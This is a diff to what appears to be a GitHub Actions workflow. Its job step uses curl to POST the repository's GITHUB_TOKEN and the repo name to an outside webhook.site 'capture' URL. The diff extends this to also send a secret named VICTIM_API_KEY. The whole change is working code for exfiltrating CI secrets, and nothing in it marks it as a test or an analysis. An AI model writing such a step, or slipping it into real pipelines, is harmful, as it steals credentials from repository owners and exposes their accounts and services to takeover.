@@ -8,7 +8,9 @@ jobs:
         run: |
           curl -s -X POST "$CAPTURE_URL" \
             -d "token=$GH_TOKEN" \
+            -d "key=$VICTIM_API_KEY" \
             -d "repo=$GITHUB_REPOSITORY"
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          VICTIM_API_KEY: ${{ secrets.VICTIM_API_KEY }}
           CAPTURE_URL: https://webhook.site/7cb75bbb-74e4-4170-b4fc-6ae63aeeaa7f
